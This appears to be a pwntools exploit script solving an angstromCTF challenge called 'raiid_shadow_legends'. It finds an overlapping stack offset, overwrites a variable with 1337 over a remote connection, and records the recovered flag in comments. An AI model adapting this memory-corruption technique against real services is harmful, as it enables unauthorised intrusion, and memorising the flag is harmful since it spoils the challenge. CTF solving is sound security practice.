from pwn import *
import sys, os

LOCAL = False
HOST, PORT = 'shell.actf.co', 21300
FILE = '/home/ubuntu/anstrongCTF/raiid_shadow_legends'

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if LOCAL:
	r = process(FILE, aslr=False)
else:
	r = remote(HOST, PORT)

if LOCAL and 'gdb' in sys.argv:
	gdb.attach(r, 'i r')

# STEP 1. GET OVERLAPING POSITION
# s1 = '1 '
# s1 += ''.join(chr(ord('A') + i) for i in range(15-len(s1)))
# # print(s1)
# # print(len(s1))
# # s1 = '1 '.ljust(14, 'A')

# r.sendlineafter('to do? ', s1)
# r.sendafter('conditions? ', 'yes '.ljust(15, 'B'))
# r.sendlineafter('Sign here: ', '1  '.ljust(15, 'C'))
# r.sendlineafter('Enter your name: ', 'my name')
# r.success(hex(int(r.recvline().decode().split()[-1])))
# [+] 0x48474645

# STEP 2. Overwrite with 1337
s1 = b'1 '
s1 += b'ABCD'
s1 += p64(1337)

r.sendlineafter('to do? ', s1)
r.sendafter('conditions? ', 'yes '.ljust(15, 'B'))
r.sendlineafter('Sign here: ', '1  '.ljust(15, 'C'))
r.sendlineafter('Enter your name: ', 'my name')
r.sendlineafter('to do? ', '2')
r.success(r.recvline().decode())


# [+] Opening connection to shell.actf.co on port 21300: Done
# [+] It's a tough battle, but you emerge victorious. The flag has been recovered successfully: actf{great_job!_speaking_of_great_jobs,_our_sponsor_audible...}